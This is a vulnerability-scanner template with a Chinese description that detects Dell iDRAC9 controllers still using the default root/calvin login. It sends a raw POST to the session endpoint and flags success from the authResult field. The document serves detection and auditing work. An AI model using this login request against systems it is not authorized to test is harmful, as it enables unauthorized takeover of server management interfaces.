id: dell-idrac9-default-login

info:
  name: DELL iDRAC9 默认口令登录（弱口令）
  author: kophjager007,milo2012
  severity: high
  description: |
    该模板通过尝试 DELL iDRAC9 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.dell.com/support/kbdoc/en-us/000177787/how-to-change-the-default-login-password-of-the-idrac-9
  classification:
    cwe-id: cwe-798
  metadata:
    max-request: 1
  tags: dell,idrac,default-login,vuln

http:
  - raw:
      - |
        POST /sysmgmt/2015/bmc/session HTTP/1.1
        Host: {{Hostname}}
        User: "{{username}}"
        Password: "{{password}}"

    payloads:
      username:
        - root
      password:
        - calvin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: regex
        name: authresult
        regex:
          - '"authResult"\s*:\s*0'

      - type: status
        status:
          - 201
          - 200
